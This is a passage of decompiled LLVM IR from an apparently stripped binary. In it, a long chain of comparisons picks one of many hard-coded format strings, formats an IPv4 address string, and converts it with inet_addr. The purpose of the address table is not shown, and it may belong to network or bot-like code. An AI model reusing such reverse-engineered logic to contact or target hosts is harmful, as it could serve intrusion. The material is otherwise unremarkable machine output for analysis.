  %v8_d09c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c0d8.410 to i32), i32 %v4_d09c, i32 %v6_d09c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0a0

dec_label_pc_d0a0:                                ; preds = %dec_label_pc_d06c, %dec_label_pc_d078
  %v7_d0a4 = icmp eq i32 %v2_ab54, 173
  br i1 %v7_d0a4, label %dec_label_pc_d0ac, label %dec_label_pc_d0d4

dec_label_pc_d0ac:                                ; preds = %dec_label_pc_d0a0
  %v3_d0b8 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d0c4 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d0d0 = sext i8 %v3_d0b8 to i32
  %v6_d0d0 = sext i8 %v3_d0c4 to i32
  %v8_d0d0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c0e8.412 to i32), i32 %v4_d0d0, i32 %v6_d0d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0d4

dec_label_pc_d0d4:                                ; preds = %dec_label_pc_d0a0, %dec_label_pc_d0ac
  %v7_d0d8 = icmp eq i32 %v2_ab54, 174
  br i1 %v7_d0d8, label %dec_label_pc_d0e0, label %dec_label_pc_d108

dec_label_pc_d0e0:                                ; preds = %dec_label_pc_d0d4
  %v3_d0ec = load i8, i8* @global_var_2687d.82, align 1
  %v3_d0f8 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d104 = sext i8 %v3_d0ec to i32
  %v6_d104 = sext i8 %v3_d0f8 to i32
  %v8_d104 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c0f8.414 to i32), i32 %v4_d104, i32 %v6_d104, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d108

dec_label_pc_d108:                                ; preds = %dec_label_pc_d0d4, %dec_label_pc_d0e0
  %v7_d10c = icmp eq i32 %v2_ab54, 175
  br i1 %v7_d10c, label %dec_label_pc_d114, label %dec_label_pc_d13c

dec_label_pc_d114:                                ; preds = %dec_label_pc_d108
  %v3_d120 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d12c = load i8, i8* @global_var_2687e.83, align 1
  %v4_d138 = sext i8 %v3_d120 to i32
  %v6_d138 = sext i8 %v3_d12c to i32
  %v8_d138 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c108.416 to i32), i32 %v4_d138, i32 %v6_d138, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d13c

dec_label_pc_d13c:                                ; preds = %dec_label_pc_d108, %dec_label_pc_d114
  %v7_d140 = icmp eq i32 %v2_ab54, 176
  br i1 %v7_d140, label %dec_label_pc_d148, label %dec_label_pc_d170

dec_label_pc_d148:                                ; preds = %dec_label_pc_d13c
  %v3_d154 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d160 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d16c = sext i8 %v3_d154 to i32
  %v6_d16c = sext i8 %v3_d160 to i32
  %v8_d16c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c118.418 to i32), i32 %v4_d16c, i32 %v6_d16c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d170

dec_label_pc_d170:                                ; preds = %dec_label_pc_d13c, %dec_label_pc_d148
  %v7_d174 = icmp eq i32 %v2_ab54, 177
  br i1 %v7_d174, label %dec_label_pc_d17c, label %dec_label_pc_d1a4

dec_label_pc_d17c:                                ; preds = %dec_label_pc_d170
  %v3_d188 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d194 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d1a0 = sext i8 %v3_d188 to i32
  %v6_d1a0 = sext i8 %v3_d194 to i32
  %v8_d1a0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c128.420 to i32), i32 %v4_d1a0, i32 %v6_d1a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1a4

dec_label_pc_d1a4:                                ; preds = %dec_label_pc_d170, %dec_label_pc_d17c
  %v7_d1a8 = icmp eq i32 %v2_ab54, 178
  br i1 %v7_d1a8, label %dec_label_pc_d1b0, label %dec_label_pc_d1d8

dec_label_pc_d1b0:                                ; preds = %dec_label_pc_d1a4
  %v3_d1bc = load i8, i8* @global_var_2687d.82, align 1
  %v3_d1c8 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d1d4 = sext i8 %v3_d1bc to i32
  %v6_d1d4 = sext i8 %v3_d1c8 to i32
  %v8_d1d4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c138.422 to i32), i32 %v4_d1d4, i32 %v6_d1d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1d8

dec_label_pc_d1d8:                                ; preds = %dec_label_pc_d1a4, %dec_label_pc_d1b0
  %v7_d1dc = icmp eq i32 %v2_ab54, 179
  br i1 %v7_d1dc, label %dec_label_pc_d1e4, label %dec_label_pc_d20c

dec_label_pc_d1e4:                                ; preds = %dec_label_pc_d1d8
  %v3_d1f0 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d1fc = load i8, i8* @global_var_2687e.83, align 1
  %v4_d208 = sext i8 %v3_d1f0 to i32
  %v6_d208 = sext i8 %v3_d1fc to i32
  %v8_d208 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c148.424 to i32), i32 %v4_d208, i32 %v6_d208, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d20c

dec_label_pc_d20c:                                ; preds = %dec_label_pc_d1d8, %dec_label_pc_d1e4
  %v7_d210 = icmp eq i32 %v2_ab54, 180
  br i1 %v7_d210, label %dec_label_pc_d218, label %dec_label_pc_d240

dec_label_pc_d218:                                ; preds = %dec_label_pc_d20c
  %v3_d224 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d230 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d23c = sext i8 %v3_d224 to i32
  %v6_d23c = sext i8 %v3_d230 to i32
  %v8_d23c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c158.426 to i32), i32 %v4_d23c, i32 %v6_d23c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d240

dec_label_pc_d240:                                ; preds = %dec_label_pc_d20c, %dec_label_pc_d218
  %v7_d244 = icmp eq i32 %v2_ab54, 181
  br i1 %v7_d244, label %dec_label_pc_d24c, label %dec_label_pc_d274

dec_label_pc_d24c:                                ; preds = %dec_label_pc_d240
  %v3_d258 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d264 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d270 = sext i8 %v3_d258 to i32
  %v6_d270 = sext i8 %v3_d264 to i32
  %v8_d270 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c168.428 to i32), i32 %v4_d270, i32 %v6_d270, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d274

dec_label_pc_d274:                                ; preds = %dec_label_pc_d240, %dec_label_pc_d24c
  %v7_d278 = icmp eq i32 %v2_ab54, 182
  br i1 %v7_d278, label %dec_label_pc_d280, label %dec_label_pc_d2a8

dec_label_pc_d280:                                ; preds = %dec_label_pc_d274
  %v3_d28c = load i8, i8* @global_var_2687d.82, align 1
  %v3_d298 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d2a4 = sext i8 %v3_d28c to i32
  %v6_d2a4 = sext i8 %v3_d298 to i32
  %v8_d2a4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c178.430 to i32), i32 %v4_d2a4, i32 %v6_d2a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2a8

dec_label_pc_d2a8:                                ; preds = %dec_label_pc_d274, %dec_label_pc_d280
  %v7_d2ac = icmp eq i32 %v2_ab54, 183
  br i1 %v7_d2ac, label %dec_label_pc_d2b4, label %dec_label_pc_d2dc

dec_label_pc_d2b4:                                ; preds = %dec_label_pc_d2a8
  %v3_d2c0 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d2cc = load i8, i8* @global_var_2687e.83, align 1
  %v4_d2d8 = sext i8 %v3_d2c0 to i32
  %v6_d2d8 = sext i8 %v3_d2cc to i32
  %v8_d2d8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b978.169 to i32), i32 %v4_d2d8, i32 %v6_d2d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2dc

dec_label_pc_d2dc:                                ; preds = %dec_label_pc_d2a8, %dec_label_pc_d2b4
  %v7_d2e0 = icmp eq i32 %v2_ab54, 184
  br i1 %v7_d2e0, label %dec_label_pc_d2e8, label %dec_label_pc_d310

dec_label_pc_d2e8:                                ; preds = %dec_label_pc_d2dc
  %v3_d2f4 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d300 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d30c = sext i8 %v3_d2f4 to i32
  %v6_d30c = sext i8 %v3_d300 to i32
  %v8_d30c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c188.433 to i32), i32 %v4_d30c, i32 %v6_d30c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d310

dec_label_pc_d310:                                ; preds = %dec_label_pc_d2dc, %dec_label_pc_d2e8
  %v7_d314 = icmp eq i32 %v2_ab54, 185
  br i1 %v7_d314, label %dec_label_pc_d31c, label %dec_label_pc_d344

dec_label_pc_d31c:                                ; preds = %dec_label_pc_d310
  %v3_d328 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d334 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d340 = sext i8 %v3_d328 to i32
  %v6_d340 = sext i8 %v3_d334 to i32
  %v8_d340 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c198.435 to i32), i32 %v4_d340, i32 %v6_d340, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d344

dec_label_pc_d344:                                ; preds = %dec_label_pc_d310, %dec_label_pc_d31c
  %v7_d348 = icmp eq i32 %v2_ab54, 186
  br i1 %v7_d348, label %dec_label_pc_d350, label %dec_label_pc_d378

dec_label_pc_d350:                                ; preds = %dec_label_pc_d344
  %v3_d35c = load i8, i8* @global_var_2687d.82, align 1
  %v3_d368 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d374 = sext i8 %v3_d35c to i32
  %v6_d374 = sext i8 %v3_d368 to i32
  %v8_d374 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c1a8.437 to i32), i32 %v4_d374, i32 %v6_d374, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d378

dec_label_pc_d378:                                ; preds = %dec_label_pc_d344, %dec_label_pc_d350
  %v7_d37c = icmp eq i32 %v2_ab54, 187
  br i1 %v7_d37c, label %dec_label_pc_d384, label %dec_label_pc_d3ac

dec_label_pc_d384:                                ; preds = %dec_label_pc_d378
  %v3_d390 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d39c = load i8, i8* @global_var_2687e.83, align 1
  %v4_d3a8 = sext i8 %v3_d390 to i32
  %v6_d3a8 = sext i8 %v3_d39c to i32
  %v8_d3a8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c1b8.439 to i32), i32 %v4_d3a8, i32 %v6_d3a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3ac

dec_label_pc_d3ac:                                ; preds = %dec_label_pc_d378, %dec_label_pc_d384
  %v7_d3b0 = icmp eq i32 %v2_ab54, 188
  br i1 %v7_d3b0, label %dec_label_pc_d3b8, label %dec_label_pc_d3e0

dec_label_pc_d3b8:                                ; preds = %dec_label_pc_d3ac
  %v3_d3c4 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d3d0 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d3dc = sext i8 %v3_d3c4 to i32
  %v6_d3dc = sext i8 %v3_d3d0 to i32
  %v8_d3dc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c1c8.441 to i32), i32 %v4_d3dc, i32 %v6_d3dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3e0

dec_label_pc_d3e0:                                ; preds = %dec_label_pc_d3ac, %dec_label_pc_d3b8
  %v7_d3e4 = icmp eq i32 %v2_ab54, 189
  br i1 %v7_d3e4, label %dec_label_pc_d3ec, label %dec_label_pc_d414

dec_label_pc_d3ec:                                ; preds = %dec_label_pc_d3e0
  %v3_d3f8 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d404 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d410 = sext i8 %v3_d3f8 to i32
  %v6_d410 = sext i8 %v3_d404 to i32
  %v8_d410 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c1d8.443 to i32), i32 %v4_d410, i32 %v6_d410, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d414

dec_label_pc_d414:                                ; preds = %dec_label_pc_d3e0, %dec_label_pc_d3ec
  %v7_d418 = icmp eq i32 %v2_ab54, 190
  br i1 %v7_d418, label %dec_label_pc_d420, label %dec_label_pc_d448

dec_label_pc_d420:                                ; preds = %dec_label_pc_d414
  %v3_d42c = load i8, i8* @global_var_2687d.82, align 1
  %v3_d438 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d444 = sext i8 %v3_d42c to i32
  %v6_d444 = sext i8 %v3_d438 to i32
  %v8_d444 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c1e8.445 to i32), i32 %v4_d444, i32 %v6_d444, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d448

dec_label_pc_d448:                                ; preds = %dec_label_pc_d414, %dec_label_pc_d420
  %v7_d44c = icmp eq i32 %v2_ab54, 191
  br i1 %v7_d44c, label %dec_label_pc_d454, label %dec_label_pc_d47c

dec_label_pc_d454:                                ; preds = %dec_label_pc_d448
  %v3_d460 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d46c = load i8, i8* @global_var_2687e.83, align 1
  %v4_d478 = sext i8 %v3_d460 to i32
  %v6_d478 = sext i8 %v3_d46c to i32
  %v8_d478 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c1f8.447 to i32), i32 %v4_d478, i32 %v6_d478, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d47c

dec_label_pc_d47c:                                ; preds = %dec_label_pc_d448, %dec_label_pc_d454
  %v7_d480 = icmp eq i32 %v2_ab54, 192
  br i1 %v7_d480, label %dec_label_pc_d488, label %dec_label_pc_d4b0

dec_label_pc_d488:                                ; preds = %dec_label_pc_d47c
  %v3_d494 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d4a0 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d4ac = sext i8 %v3_d494 to i32
  %v6_d4ac = sext i8 %v3_d4a0 to i32
  %v8_d4ac = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c208.449 to i32), i32 %v4_d4ac, i32 %v6_d4ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4b0

dec_label_pc_d4b0:                                ; preds = %dec_label_pc_d47c, %dec_label_pc_d488
  %v7_d4b4 = icmp eq i32 %v2_ab54, 193
  br i1 %v7_d4b4, label %dec_label_pc_d4bc, label %dec_label_pc_d4e4

dec_label_pc_d4bc:                                ; preds = %dec_label_pc_d4b0
  %v3_d4c8 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d4d4 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d4e0 = sext i8 %v3_d4c8 to i32
  %v6_d4e0 = sext i8 %v3_d4d4 to i32
  %v8_d4e0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c218.451 to i32), i32 %v4_d4e0, i32 %v6_d4e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4e4

dec_label_pc_d4e4:                                ; preds = %dec_label_pc_d4b0, %dec_label_pc_d4bc
  %v7_d4e8 = icmp eq i32 %v2_ab54, 194
  br i1 %v7_d4e8, label %dec_label_pc_d4f0, label %dec_label_pc_d518

dec_label_pc_d4f0:                                ; preds = %dec_label_pc_d4e4
  %v3_d4fc = load i8, i8* @global_var_2687d.82, align 1
  %v3_d508 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d514 = sext i8 %v3_d4fc to i32
  %v6_d514 = sext i8 %v3_d508 to i32
  %v8_d514 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c228.453 to i32), i32 %v4_d514, i32 %v6_d514, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d518

dec_label_pc_d518:                                ; preds = %dec_label_pc_d4e4, %dec_label_pc_d4f0
  %v7_d51c = icmp eq i32 %v2_ab54, 195
  br i1 %v7_d51c, label %dec_label_pc_d524, label %dec_label_pc_d54c

dec_label_pc_d524:                                ; preds = %dec_label_pc_d518
  %v3_d530 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d53c = load i8, i8* @global_var_2687e.83, align 1
  %v4_d548 = sext i8 %v3_d530 to i32
  %v6_d548 = sext i8 %v3_d53c to i32
  %v8_d548 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c238.455 to i32), i32 %v4_d548, i32 %v6_d548, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d54c

dec_label_pc_d54c:                                ; preds = %dec_label_pc_d518, %dec_label_pc_d524
  %v7_d550 = icmp eq i32 %v2_ab54, 196
  br i1 %v7_d550, label %dec_label_pc_d558, label %dec_label_pc_d580

dec_label_pc_d558:                                ; preds = %dec_label_pc_d54c
  %v3_d564 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d570 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d57c = sext i8 %v3_d564 to i32
  %v6_d57c = sext i8 %v3_d570 to i32
  %v8_d57c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c248.457 to i32), i32 %v4_d57c, i32 %v6_d57c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d580

dec_label_pc_d580:                                ; preds = %dec_label_pc_d54c, %dec_label_pc_d558
  %v7_d584 = icmp eq i32 %v2_ab54, 197
  br i1 %v7_d584, label %dec_label_pc_d58c, label %dec_label_pc_d5b4

dec_label_pc_d58c:                                ; preds = %dec_label_pc_d580
  %v3_d598 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d5a4 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d5b0 = sext i8 %v3_d598 to i32
  %v6_d5b0 = sext i8 %v3_d5a4 to i32
  %v8_d5b0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c258.459 to i32), i32 %v4_d5b0, i32 %v6_d5b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5b4

dec_label_pc_d5b4:                                ; preds = %dec_label_pc_d580, %dec_label_pc_d58c
  %v7_d5b8 = icmp eq i32 %v2_ab54, 198
  br i1 %v7_d5b8, label %dec_label_pc_d5c0, label %dec_label_pc_d5e8

dec_label_pc_d5c0:                                ; preds = %dec_label_pc_d5b4
  %v3_d5cc = load i8, i8* @global_var_2687d.82, align 1
  %v3_d5d8 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d5e4 = sext i8 %v3_d5cc to i32
  %v6_d5e4 = sext i8 %v3_d5d8 to i32
  %v8_d5e4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c268.461 to i32), i32 %v4_d5e4, i32 %v6_d5e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5e8

dec_label_pc_d5e8:                                ; preds = %dec_label_pc_d5b4, %dec_label_pc_d5c0
  %v7_d5ec = icmp eq i32 %v2_ab54, 199
  br i1 %v7_d5ec, label %dec_label_pc_d5f4, label %dec_label_pc_d61c

dec_label_pc_d5f4:                                ; preds = %dec_label_pc_d5e8
  %v3_d600 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d60c = load i8, i8* @global_var_2687e.83, align 1
  %v4_d618 = sext i8 %v3_d600 to i32
  %v6_d618 = sext i8 %v3_d60c to i32
  %v8_d618 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c278.463 to i32), i32 %v4_d618, i32 %v6_d618, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d61c

dec_label_pc_d61c:                                ; preds = %dec_label_pc_d5e8, %dec_label_pc_d5f4
  %v7_d620 = icmp eq i32 %v2_ab54, 200
  br i1 %v7_d620, label %dec_label_pc_d628, label %dec_label_pc_d650

dec_label_pc_d628:                                ; preds = %dec_label_pc_d61c
  %v3_d634 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d640 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d64c = sext i8 %v3_d634 to i32
  %v6_d64c = sext i8 %v3_d640 to i32
  %v8_d64c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c288.465 to i32), i32 %v4_d64c, i32 %v6_d64c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d650

dec_label_pc_d650:                                ; preds = %dec_label_pc_d61c, %dec_label_pc_d628
  %v7_d654 = icmp eq i32 %v2_ab54, 201
  br i1 %v7_d654, label %dec_label_pc_d690, label %dec_label_pc_d684

dec_label_pc_d684:                                ; preds = %dec_label_pc_d650
  br label %dec_label_pc_d6b8

dec_label_pc_d690:                                ; preds = %dec_label_pc_d650
  %v3_d668 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d674 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d680 = sext i8 %v3_d668 to i32
  %v6_d680 = sext i8 %v3_d674 to i32
  %v8_d680 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c298.467 to i32), i32 %v4_d680, i32 %v6_d680, i32 ptrtoint (i32* @0 to i32))
  %v3_d69c = load i8, i8* @global_var_2687d.82, align 1
  %v3_d6a8 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d6b4 = sext i8 %v3_d69c to i32
  %v6_d6b4 = sext i8 %v3_d6a8 to i32
  %v8_d6b4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c2a8.469 to i32), i32 %v4_d6b4, i32 %v6_d6b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d6b8

dec_label_pc_d6b8:                                ; preds = %dec_label_pc_d684, %dec_label_pc_d690
  %v7_d6bc = icmp eq i32 %v2_ab54, 202
  br i1 %v7_d6bc, label %dec_label_pc_d6c4, label %dec_label_pc_d6ec

dec_label_pc_d6c4:                                ; preds = %dec_label_pc_d6b8
  %v3_d6d0 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d6dc = load i8, i8* @global_var_2687e.83, align 1
  %v4_d6e8 = sext i8 %v3_d6d0 to i32
  %v6_d6e8 = sext i8 %v3_d6dc to i32
  %v8_d6e8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c2b8.471 to i32), i32 %v4_d6e8, i32 %v6_d6e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d6ec

dec_label_pc_d6ec:                                ; preds = %dec_label_pc_d6b8, %dec_label_pc_d6c4
  %v7_d6f0 = icmp eq i32 %v2_ab54, 203
  br i1 %v7_d6f0, label %dec_label_pc_d6f8, label %dec_label_pc_d720

dec_label_pc_d6f8:                                ; preds = %dec_label_pc_d6ec
  %v3_d704 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d710 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d71c = sext i8 %v3_d704 to i32
  %v6_d71c = sext i8 %v3_d710 to i32
  %v8_d71c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c2c8.473 to i32), i32 %v4_d71c, i32 %v6_d71c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d720

dec_label_pc_d720:                                ; preds = %dec_label_pc_d6ec, %dec_label_pc_d6f8
  %v7_d724 = icmp eq i32 %v2_ab54, 204
  br i1 %v7_d724, label %dec_label_pc_d72c, label %dec_label_pc_d754

dec_label_pc_d72c:                                ; preds = %dec_label_pc_d720
  %v3_d738 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d744 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d750 = sext i8 %v3_d738 to i32
  %v6_d750 = sext i8 %v3_d744 to i32
  %v8_d750 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c2d8.475 to i32), i32 %v4_d750, i32 %v6_d750, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d754

dec_label_pc_d754:                                ; preds = %dec_label_pc_d720, %dec_label_pc_d72c
  %v7_d758 = icmp eq i32 %v2_ab54, 205
  br i1 %v7_d758, label %dec_label_pc_d760, label %dec_label_pc_d788

dec_label_pc_d760:                                ; preds = %dec_label_pc_d754
  %v3_d76c = load i8, i8* @global_var_2687d.82, align 1
  %v3_d778 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d784 = sext i8 %v3_d76c to i32
  %v6_d784 = sext i8 %v3_d778 to i32
  %v8_d784 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c2e8.477 to i32), i32 %v4_d784, i32 %v6_d784, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d788

dec_label_pc_d788:                                ; preds = %dec_label_pc_d754, %dec_label_pc_d760
  %v7_d78c = icmp eq i32 %v2_ab54, 206
  br i1 %v7_d78c, label %dec_label_pc_d794, label %dec_label_pc_d7bc

dec_label_pc_d794:                                ; preds = %dec_label_pc_d788
  %v3_d7a0 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d7ac = load i8, i8* @global_var_2687e.83, align 1
  %v4_d7b8 = sext i8 %v3_d7a0 to i32
  %v6_d7b8 = sext i8 %v3_d7ac to i32
  %v8_d7b8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1c2f8.479 to i32), i32 %v4_d7b8, i32 %v6_d7b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d7bc

dec_label_pc_d7bc:                                ; preds = %dec_label_pc_d788, %dec_label_pc_d794
  %v7_d7c0 = icmp eq i32 %v2_ab54, 207
  br i1 %v7_d7c0, label %dec_label_pc_d7c8, label %dec_label_pc_d7f0

dec_label_pc_d7c8:                                ; preds = %dec_label_pc_d7bc
  %v3_d7d4 = load i8, i8* @global_var_2687d.82, align 1
  %v3_d7e0 = load i8, i8* @global_var_2687e.83, align 1
  %v4_d7ec = sext i8 %v3_d7d4 to i32
  %v6_d7ec = sext i8 %v3_d7e0 to i32
  %v8_d7ec = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1c308.481 to i32), i32 %v4_d7ec, i32 %v6_d7ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d7f0

dec_label_pc_d7f0:                                ; preds = %dec_label_pc_d7bc, %dec_label_pc_d7c8
  store i32 %v2_aa80, i32* @r0, align 4
  %v1_d82c = call i32 @inet_addr(i32 %v2_aa80)
  store i32 %v3_aa78, i32* @fp, align 4
  ret i32 %v1_d82c

; uselistorder directives
  uselistorder i32 %v2_aa80, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1c038.389 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1bfcc.374 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1be3c.324 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1bdb0.306 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1bd50.294 to i32), { 1, 0 }
